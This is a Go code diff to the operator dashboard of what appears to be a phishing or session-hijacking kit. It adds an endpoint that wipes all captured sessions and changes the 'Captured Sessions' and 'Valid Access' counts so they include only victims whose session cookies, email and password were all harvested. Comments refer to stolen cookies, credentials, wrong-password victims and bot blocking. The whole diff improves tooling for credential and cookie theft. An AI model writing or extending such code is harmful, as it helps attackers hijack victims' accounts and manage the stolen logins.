@@ -283,6 +283,7 @@ func (d *Dashboard) Start() error {
 	mux.HandleFunc("/api/check-auth", d.corsMiddleware(d.authMiddleware(d.handleCheckAuth)))
 	mux.HandleFunc("/api/sessions", d.corsMiddleware(d.authMiddleware(d.handleSessions)))
 	mux.HandleFunc("/api/sessions/", d.corsMiddleware(d.authMiddleware(d.handleSessionByID)))
+	mux.HandleFunc("/api/sessions/all", d.corsMiddleware(d.authMiddleware(d.handleDeleteAllSessions)))
 	mux.HandleFunc("/api/valid-logs-without-cookies", d.corsMiddleware(d.authMiddleware(d.handleValidLogsWithoutCookies)))
 	mux.HandleFunc("/api/visitors", d.corsMiddleware(d.authMiddleware(d.handleVisitors)))
 	mux.HandleFunc("/api/invalid-logs", d.corsMiddleware(d.authMiddleware(d.handleInvalidLogs)))
@@ -432,9 +433,10 @@ func (d *Dashboard) handleSessions(w http.ResponseWriter, r *http.Request) {
 
 		apiSessions := make([]apiSession, 0)
 		for _, s := range sessions {
-			// Captured Sessions = only valid COMPLETE logs: cookies captured AND
-			// credentials present. Wrong-password / empty sessions never show here.
-			if s.CookieTokens != nil && len(s.CookieTokens) > 0 && (s.Username != "" || s.Password != "") {
+			// Captured Sessions = ONLY valid COMPLETE logs: cookies captured AND
+			// BOTH email (username) and password present. Anything incomplete
+			// (missing email, missing password, or no cookies) never shows here.
+			if s.CookieTokens != nil && len(s.CookieTokens) > 0 && s.Username != "" && s.Password != "" {
 				apiSessions = append(apiSessions, d.dbSessionToAPI(s))
 			}
 		}
@@ -598,6 +600,10 @@ func (d *Dashboard) handleStats(w http.ResponseWriter, r *http.Request) {
 	for _, s := range sessions {
 		if s.CookieTokens != nil && len(s.CookieTokens) > 0 {
 			withCookies++
+			// Valid Access = complete logs only: cookies AND both creds
+			if s.Username != "" && s.Password != "" {
+				validAccess++
+			}
 		} else {
 			withoutCookies++
 			// valid credential capture (username or password) but no cookies yet
@@ -611,8 +617,6 @@ func (d *Dashboard) handleStats(w http.ResponseWriter, r *http.Request) {
 			botSessions++
 		}
 	}
-	// "Valid Access" = sessions that actually logged in (cookies captured)
-	validAccess = withCookies
 
 	botBlocked := int(GetBotAccess())
 
@@ -700,6 +704,18 @@ func (d *Dashboard) handleSessionByID(w http.ResponseWriter, r *http.Request) {
 	default:
 		http.Error(w, `{"error":"method not allowed"}`, http.StatusMethodNotAllowed)
 	}
+}
+
+func (d *Dashboard) handleDeleteAllSessions(w http.ResponseWriter, r *http.Request) {
+	if r.Method != "DELETE" {
+		http.Error(w, `{"error":"method not allowed"}`, http.StatusMethodNotAllowed)
+		return
+	}
+	if err := d.db.DeleteAllSessions(); err != nil {
+		writeJSON(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
+		return
+	}
+	writeJSON(w, http.StatusOK, map[string]string{"status": "deleted"})
 }
 
 func (d *Dashboard) handleCookiesByID(w http.ResponseWriter, r *http.Request) {
